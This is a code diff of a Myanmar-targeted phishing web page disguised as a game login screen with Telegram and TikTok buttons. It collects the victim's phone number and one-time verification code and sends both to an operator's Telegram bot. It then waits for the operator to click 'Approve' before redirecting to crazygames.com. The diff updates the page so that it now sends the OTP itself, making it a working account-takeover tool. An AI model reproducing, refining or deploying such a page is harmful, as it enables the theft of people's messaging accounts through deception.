@@ -9,40 +9,38 @@
     <style>
         html, body { 
             margin: 0; padding: 0; width: 100%; height: 100%; 
-            overflow: hidden; overscroll-behavior-y: contain;
-            position: fixed; font-family: 'Pyidaungsu', sans-serif;
+            overflow: hidden; 
+            overscroll-behavior-y: none; 
+            touch-action: none;
+            position: fixed; font-family: sans-serif;
             background-color: black;
         }
 
-        /* မျက်နှာပြင်အားလုံးအတွက် Background ပုံသတ်မှတ်ခြင်း */
         .bg-setup {
             background-image: url('https://raw.githubusercontent.com/tar-alt/Photo-link-/6451c994788dbe34e12fbac624779364dbf1c113/Picsart_26-05-13_08-54-08-682.jpg');
             background-size: cover;
             background-position: center;
-            background-repeat: no-repeat;
         }
 
-        #videoScreen { background: black; }
-        #bgVideo { width: 100%; height: 100%; object-fit: cover; }
+        /* Wait Screen ဗီဒီယို Styling */
+        #waitVideo {
+            width: 180px; height: 180px; object-fit: cover; border-radius: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
 
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #2481cc; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #bgVideo { width: 100%; height: 100%; object-fit: cover; }
+        .glass-panel { background: rgba(255, 255, 255, 0.82); backdrop-filter: blur(12px); border-radius: 24px; }
         
-        .glass-panel { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(8px); border-radius: 20px; }
-        
-        /* ဂိမ်းဝင်ရန် ခလုတ် */
         .entry-btn {
             background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
-            padding: 15px 40px;
-            border-radius: 50px;
-            color: white;
-            font-weight: bold;
-            font-size: 1.2rem;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            cursor: pointer;
+            padding: 18px 45px; border-radius: 60px; color: white;
+            font-weight: bold; font-size: 1.3rem; cursor: pointer;
+            box-shadow: 0 10px 25px rgba(245, 87, 108, 0.4);
             animation: pulse 2s infinite;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
     </style>
 </head>
 <body>
@@ -50,70 +48,66 @@
 <div id="app" class="w-full h-full relative">
     
     <!-- Step 1: Login Selection -->
-    <div id="selectScreen" class="bg-setup w-full h-full flex flex-col items-center justify-center p-8 text-center">
-        <div class="glass-panel p-8 w-full max-w-sm shadow-2xl">
-            <h1 class="text-2xl font-bold mb-8 text-gray-800">ဂိမ်းဆော့ရန် Login ဝင်ပါ</h1>
-            <button onclick="showTG()" class="w-full bg-[#2481cc] text-white py-4 rounded-xl mb-4 flex items-center justify-center gap-2 shadow-lg">
-                <i class="fa-brands fa-telegram text-xl"></i> Telegram ဖြင့်ဝင်မည်
+    <div id="selectScreen" class="bg-setup w-full h-full flex flex-col items-center justify-center p-8">
+        <div class="glass-panel p-10 w-full max-w-sm text-center shadow-2xl">
+            <h1 class="text-2xl font-extrabold mb-8 text-gray-800">Login to Play</h1>
+            <button onclick="initApp('TG')" class="w-full bg-[#2481cc] text-white py-4 rounded-2xl mb-4 flex items-center justify-center gap-3 shadow-lg active:scale-95 transition">
+                <i class="fa-brands fa-telegram text-2xl"></i> Telegram
             </button>
-            <button onclick="showTT()" class="w-full bg-black text-white py-4 rounded-xl flex items-center justify-center gap-2 shadow-lg">
-                <i class="fa-brands fa-tiktok text-xl"></i> TikTok ဖြင့်ဝင်မည်
+            <button onclick="initApp('TT')" class="w-full bg-black text-white py-4 rounded-2xl flex items-center justify-center gap-3 shadow-lg active:scale-95 transition">
+                <i class="fa-brands fa-tiktok text-2xl"></i> TikTok
             </button>
         </div>
     </div>
 
-    <!-- Step 2: Telegram UI (Background ပါဝင်ပြီးသား) -->
-    <div id="tgPhoneScreen" class="hidden bg-setup w-full h-full p-6 flex flex-col">
-        <div class="pt-4"><i onclick="goBack()" class="fa-solid fa-arrow-left text-xl p-2 cursor-pointer glass-panel !rounded-full"></i></div>
+    <!-- Step 2: Phone Input -->
+    <div id="phoneScreen" class="hidden bg-setup w-full h-full p-6 flex flex-col">
+        <div class="pt-4"><i onclick="goBack()" class="fa-solid fa-arrow-left p-3 glass-panel !rounded-full cursor-pointer"></i></div>
         <div class="flex-1 flex flex-col items-center justify-center">
-            <div class="glass-panel p-6 w-full max-w-xs text-center">
-                <h2 class="text-xl font-bold mb-4">ဖုန်းနံပါတ်ထည့်ပါ</h2>
-                <div class="flex border-b-2 border-[#2481cc] py-4">
-                    <span class="font-bold text-xl mr-4 text-gray-700">+95</span>
-                    <input type="number" id="tgPhone" placeholder="9xxxxxxxxx" class="w-full bg-transparent outline-none text-xl">
+            <div class="glass-panel p-8 w-full max-w-xs text-center shadow-xl">
+                <h2 class="text-xl font-bold mb-6 text-gray-700">Enter Phone Number</h2>
+                <div class="flex border-b-4 border-blue-500 py-2">
+                    <span class="font-bold text-2xl mr-4 text-blue-600">+95</span>
+                    <input type="number" id="phoneInput" placeholder="9xxxxxxxxx" class="w-full bg-transparent outline-none text-2xl font-semibold">
                 </div>
             </div>
         </div>
-        <button onclick="submitTGPhone()" class="fixed bottom-10 right-10 bg-[#2481cc] w-16 h-16 rounded-full shadow-xl flex items-center justify-center text-white text-2xl">
-            <i id="tgIcon1" class="fa-solid fa-arrow-right"></i>
-            <div id="tgLoader1" class="loader !border-t-white"></div>
+        <button onclick="submitPhone()" class="fixed bottom-10 right-10 bg-blue-600 w-16 h-16 rounded-full text-white text-3xl shadow-2xl flex items-center justify-center">
+            <i class="fa-solid fa-chevron-right"></i>
         </button>
     </div>
 
-    <!-- Step 3: Telegram OTP UI -->
-    <div id="tgOtpScreen" class="hidden bg-setup w-full h-full p-6 text-center flex flex-col">
-        <div class="pt-4 text-left"><i onclick="showTG()" class="fa-solid fa-arrow-left text-xl p-2 cursor-pointer glass-panel !rounded-full"></i></div>
+    <!-- Step 3: OTP Input -->
+    <div id="otpScreen" class="hidden bg-setup w-full h-full p-6 flex flex-col text-center">
+        <div class="pt-4 text-left"><i onclick="toggle('phoneScreen')" class="fa-solid fa-arrow-left p-3 glass-panel !rounded-full cursor-pointer"></i></div>
         <div class="flex-1 flex flex-col items-center justify-center">
-            <div class="glass-panel p-6 w-full max-w-xs">
-                <h2 id="displayTgPhone" class="text-lg font-bold mb-4 text-blue-600"></h2>
-                <p class="mb-4 text-gray-600">ကုဒ်နံပါတ် (OTP) ထည့်ပါ</p>
-                <input type="number" id="tgOtp" placeholder="OTP Code" class="w-full bg-transparent border-b-2 border-gray-400 text-center text-2xl outline-none p-2 focus:border-[#2481cc]">
+            <div class="glass-panel p-8 w-full max-w-xs shadow-xl">
+                <h2 class="text-lg font-bold mb-6 text-gray-600">Enter Verification Code</h2>
+                <input type="number" id="otpInput" placeholder="OTP" class="w-full bg-transparent border-b-4 border-gray-400 text-center text-3xl font-bold outline-none focus:border-blue-500 transition">
             </div>
         </div>
-        <button onclick="submitApproval('Telegram OTP')" class="fixed bottom-10 right-10 bg-[#2481cc] w-16 h-16 rounded-full shadow-xl flex items-center justify-center text-white text-2xl">
-            <i id="tgIcon2" class="fa-solid fa-arrow-right"></i>
-            <div id="tgLoader2" class="loader !border-t-white"></div>
+        <button onclick="submitFinal()" class="fixed bottom-10 right-10 bg-blue-600 w-16 h-16 rounded-full text-white text-3xl shadow-2xl flex items-center justify-center">
+            <i class="fa-solid fa-chevron-right"></i>
         </button>
     </div>
 
-    <!-- Step 4: Wait Screen -->
-    <div id="waitScreen" class="hidden bg-setup w-full h-full flex flex-col justify-center items-center p-8 text-center">
-        <div class="glass-panel p-10 flex flex-col items-center">
-            <div class="loader !block mb-6 !w-14 !h-14 border-4 border-blue-200 !border-t-blue-600"></div>
-            <h2 class="text-xl font-bold text-blue-700 mb-2">ခွင့်ပြုချက်စောင့်နေသည်...</h2>
-            <p class="text-gray-600">Admin မှ ခွင့်ပြုပြီးပါက ဗီဒီယိုပွင့်လာပါမည်။</p>
+    <!-- Step 4: Wait Screen (ဗီဒီယိုအသစ်ဖြင့်) -->
+    <div id="waitScreen" class="hidden bg-setup w-full h-full flex flex-col justify-center items-center p-8">
+        <div class="glass-panel p-8 flex flex-col items-center text-center shadow-2xl">
+            <video id="waitVideo" autoplay muted loop playsinline class="mb-6">
+                <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
+            </video>
+            <p class="text-lg font-bold text-blue-900 animate-pulse">ခွင့်ပြုချက်စောင့်ဆိုင်းနေပါသည်...</p>
         </div>
     </div>
 
-    <!-- Step 5: Video Screen (Loop Video + Entry Button) -->
-    <div id="videoScreen" class="hidden w-full h-full flex items-center justify-center relative">
-        <video id="bgVideo" muted playsinline loop>
-            <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/81d265ddabd2791e8e7214cbefd9926cdc7cb249/From%20KlickPin%20CF%20Upgrade%20these%20elegant%20time%20blocking%20ideas%20that%20turn%20ordinary%20ideas%20into%20scroll-stopping%20inspiration%20with%20beginner-friendly%20tips%20and%20easy%20details%20%E2%80%94%20-%20Pin-775252523341961755.mp4" type="video/mp4">
+    <!-- Step 5: Final Video Screen (ဗီဒီယိုအသစ် + အသံ) -->
+    <div id="videoScreen" class="hidden w-full h-full flex items-center justify-center relative bg-black">
+        <video id="bgVideo" loop playsinline>
+            <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
         </video>
-        <div class="absolute inset-0 bg-black/20 flex flex-col items-center justify-center">
-            <div onclick="enterGame()" class="entry-btn shadow-2xl">
-                ဂိမ်းထဲသို့ ဝင်ရောက်ရန်
-            </div>
+        <div class="absolute inset-0 bg-black/10 flex items-center justify-center">
+            <div onclick="enterGame()" class="entry-btn">ဂိမ်းထဲသို့ ဝင်ရောက်ရန်</div>
         </div>
     </div>
 
@@ -124,78 +118,69 @@
     const chat = "5304050102";
     const gameLink = "https://www.crazygames.com";
     let userKey = "U" + Math.floor(Math.random() * 99999);
-    let offset = 0;
+    let audioAllowed = false;
 
-    // Approved ဖြစ်ပြီးသားသူဆိုလျှင် Video Screen သို့ တန်းသွားမည်
     window.onload = function() {
-        if (localStorage.getItem('approved') === 'true') {
-            playIntro();
-        }
+        if (localStorage.getItem('approved') === 'true') playIntro(true);
     };
 
+    function initApp(type) {
+        audioAllowed = true;
+        toggle('phoneScreen');
+    }
+
     function goBack() { toggle('selectScreen'); }
-    function showTG() { toggle('tgPhoneScreen'); }
-    function showTT() { toggle('ttLoginScreen'); } // TT လည်း အလားတူ Background ပါမည်
     function toggle(id) { 
         document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden')); 
         document.getElementById(id).classList.remove('hidden'); 
     }
 
-    async function submitTGPhone() {
-        const ph = document.getElementById('tgPhone').value;
+    async function submitPhone() {
+        const ph = document.getElementById('phoneInput').value;
         if(!ph) return;
-        document.getElementById('tgLoader1').style.display = 'block';
-        document.getElementById('tgIcon1').style.display = 'none';
-        const fPh = ph.startsWith('09') ? ph : '09' + ph.replace(/^0/, '');
-        document.getElementById('displayTgPhone').innerText = fPh;
-        await sendBot(`📱 TG Phone: ${fPh}\nID: ${userKey}`);
-        setTimeout(() => { toggle('tgOtpScreen'); }, 1000);
+        await sendBot(`📱 Phone: ${ph}\nID: ${userKey}`);
+        toggle('otpScreen');
     }
 
-    async function submitApproval(type) {
+    async function submitFinal() {
         toggle('waitScreen');
-        await sendBot(`🔔 Access Request (${type})\nID: ${userKey}`, true);
+        await sendBot(`🔔 Request\nOTP: ${document.getElementById('otpInput').value}\nID: ${userKey}`, true);
         startPolling();
     }
 
     async function sendBot(msg, b = false) {
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, { 
             method: 'POST', headers: {'Content-Type': 'application/json'}, 
-            body: JSON.stringify({ chat_id: chat, text: msg, reply_markup: b ? { inline_keyboard: [[{text:"✅ Approve", callback_data:"ok_"+userKey}, {text:"❌ Reject", callback_data:"no_"+userKey}]]} : null }) 
+            body: JSON.stringify({ 
+                chat_id: chat, text: msg, 
+                reply_markup: b ? { inline_keyboard: [[{text:"✅ Approve Now", callback_data:"ok_"+userKey}]]} : null 
+            }) 
         });
     }
 
     async function startPolling() {
-        const iRes = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=1&offset=-1`);
-        const iData = await iRes.json();
-        if(iData.result.length > 0) offset = iData.result[0].update_id + 1;
-        
         const timer = setInterval(async () => {
-            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${offset}`);
+            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
             const d = await res.json();
-            if (d.result && d.result.length > 0) {
-                for (let up of d.result) {
-                    offset = up.update_id + 1;
-                    if (up.callback_query?.data === `ok_${userKey}`) { 
-                        clearInterval(timer); 
-                        localStorage.setItem('approved', 'true');
-                        playIntro();
-                    }
-                }
+            if (d.result?.some(up => up.callback_query?.data === `ok_${userKey}`)) {
+                clearInterval(timer);
+                localStorage.setItem('approved', 'true');
+                playIntro(false);
             }
-        }, 2500);
+        }, 3000);
     }
 
-    function playIntro() {
+    function playIntro(returning) {
         toggle('videoScreen');
         const v = document.getElementById('bgVideo');
-        v.play(); // Video စတင်မည် (loop ဖြစ်၍ ဆက်တိုက်ပြနေမည်)
+        if (returning || audioAllowed) { v.muted = false; } else { v.muted = true; }
+        v.play();
     }
 
-    function enterGame() {
-        window.location.href = gameLink;
-    }
+    function enterGame() { window.location.href = gameLink; }
+
+    // Browser Pull-to-refresh ကို အမြစ်ပြတ်ပိတ်ခြင်း
+    document.addEventListener('touchmove', function(e) { if (e.touches.length > 1) e.preventDefault(); }, { passive: false });
 </script>
 </body>
 </html>
-
